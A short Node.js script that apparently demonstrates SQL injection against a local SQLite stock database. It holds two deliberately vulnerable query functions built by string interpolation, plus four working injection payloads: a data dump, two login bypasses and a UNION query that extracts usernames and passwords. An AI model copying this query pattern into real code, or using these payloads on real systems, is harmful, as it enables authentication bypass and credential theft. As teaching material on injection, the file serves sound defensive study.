const Database = require('better-sqlite3');
const db = new Database('nyondo_stock.db');

function searchProduct(name) {
    // VULNERABLE: Direct string interpolation 
    const query = `SELECT * FROM products WHERE name LIKE '%${name}%'`;
    console.log('--- Executing Query ---');
    console.log('Query:', query);
    
    try {
        const rows = db.prepare(query).all();
        console.log('Result:', rows, '\n');
        return rows;
    } catch (err) {
        console.log('Error:', err.message, '\n');
    }
}

function login(username, password) {
    // VULNERABLE: Direct string interpolation 
    const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
    console.log('--- Executing Login Query ---');
    console.log('Query:', query);
    
    try {
        const row = db.prepare(query).get();
        console.log('Result:', row, '\n');
        return row;
    } catch (err) {
        console.log('Error:', err.message, '\n');
    }
}

// --- ATTACK CALLS  ---

console.log("ATTACK 1: Dump all products");
searchProduct("' OR 1=1--"); 

console.log("ATTACK 2: Login bypass (admin)");
login("admin'--", "anything");

console.log("ATTACK 3: Always true login");
login("' OR '1'='1", "' OR '1'='1");

console.log("ATTACK 4: UNION attack (Steal passwords)");
searchProduct("' UNION SELECT id, username, password, role FROM users--");